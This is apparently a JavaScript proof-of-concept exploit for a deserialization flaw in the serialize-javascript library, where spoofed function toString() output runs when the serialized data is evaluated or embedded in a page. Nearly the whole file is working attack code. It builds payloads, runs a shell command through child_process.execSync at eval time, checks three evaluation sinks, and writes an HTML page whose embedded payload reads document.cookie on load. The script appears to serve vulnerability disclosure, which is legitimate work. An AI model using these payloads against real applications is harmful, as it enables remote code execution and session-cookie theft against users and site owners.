'use strict';
const serialize = require('serialize-javascript');
const vm = require('vm');
const fs = require('fs');

// STEP 1 — attacker-controlled object: a function whose toString() is spoofed.
const ATTACKER_EXPRESSION = '(__p("ran"),42)/*=>*/';
function makeSpoofedFunction() {
  const f = function () { return 'this real body never runs'; };
  f.toString = function () { return ATTACKER_EXPRESSION; };
  return f;
}
const attackerObject = { user: 'alice', calc: makeSpoofedFunction() };

// STEP 2 — serialize() emits the spoofed string VERBATIM in expression position.
const serialized = serialize(attackerObject);
console.log('serialized output : ' + serialized);
console.log('contains "function" keyword : ' + /function/.test(serialized));
console.log('contains "</script" markup  : ' + /<\/script/.test(serialized));

// STEP 3 — evaluating the output executes the expression. Nothing was called.
const sideEffects = [];
globalThis.__p = function (v) { sideEffects.push(v); return v; };
console.log('side effects BEFORE eval : ' + JSON.stringify(sideEffects));
const deserialized = eval('(' + serialized + ')');
console.log('side effects AFTER  eval : ' + JSON.stringify(sideEffects));

// STEP 4 — type confusion: the "function" slot deserialized to a number.
console.log('typeof deserialized.calc : ' + typeof deserialized.calc);
console.log('value  deserialized.calc : ' + deserialized.calc);

// STEP 5 — negative control: a REAL function is inert at eval time.
const realSerialized = serialize({ user: 'alice', calc: function (a, b) { return a + b; } });
console.log('serialized real function : ' + realSerialized);
const realDeserialized = eval('(' + realSerialized + ')');
console.log('typeof at eval time      : ' + typeof realDeserialized.calc);
console.log('calling it explicitly    : calc(2,3) = ' + realDeserialized.calc(2, 3));

// STEP 6 — arbitrary command execution during deserialization + sink matrix.
function makeRceFunction() {
  const g = function () {};
  g.toString = function () {
    return '(globalThis.__cmdOutput = require("child_process")' +
           '.execSync("echo RCE-AT-EVAL-TIME").toString().trim(),42)/*=>*/';
  };
  return g;
}
console.log('__cmdOutput before eval : ' + String(globalThis.__cmdOutput));
eval('(' + serialize({ calc: makeRceFunction() }) + ')');
console.log('__cmdOutput after  eval : ' + String(globalThis.__cmdOutput));

function runInSink(name, fn) {
  let seen = null;
  globalThis.__p = function (v) { seen = v; return v; };
  fn(serialize({ calc: makeSpoofedFunction() }));
  console.log('  ' + name.padEnd(24) + ' -> executed: ' + (seen === 'ran'));
}
runInSink('eval(...)',                s => eval('(' + s + ')'));
runInSink('new Function(...)()',      s => new Function('return (' + s + ')')());
runInSink('vm.runInThisContext(...)', s => vm.runInThisContext('(' + s + ')'));

// STEP 7 — isJSON:true is the safe option (functions dropped before serializer).
const jf = function () {};
jf.toString = function () { return '(__p("json"),42)/*=>*/'; };
console.log('isJSON output: ' + serialize({ calc: jf }, { isJSON: true }));

// STEP 8 — write the browser page: entire script block is one assignment,
// zero eval / new Function / vm calls anywhere in the file.
const embedSerialized = serialize({
  calc: (function () {
    const f = function () {};
    f.toString = function () {
      return '(' +
        'document.title=String.fromCharCode(69,77,66,69,68,45,65,76,79,78,69,45,69,88,69,67,85,84,69,68),' +
        'document.getElementById("box").textContent="PAYLOAD RAN ON EMBED - cookie: "+document.cookie,' +
        'window.__embedRan=true,42)/*=>*/';
    };
    return f;
  })()
});
fs.writeFileSync('poc-embed.html',
  '<!DOCTYPE html>\n<html><head><meta charset="utf-8"><title>before-injection</title></head>\n' +
  '<body>\n<h1>serialize-javascript 7.1.2 - embedding alone triggers execution</h1>\n' +
  '<div id="box">(payload has not run yet)</div>\n<script>\n' +
  'document.cookie = "session=demo-session-12345; path=/";\n' +
  'var data = ' + embedSerialized + ';\n</script>\n</body></html>\n');
console.log('wrote poc-embed.html');
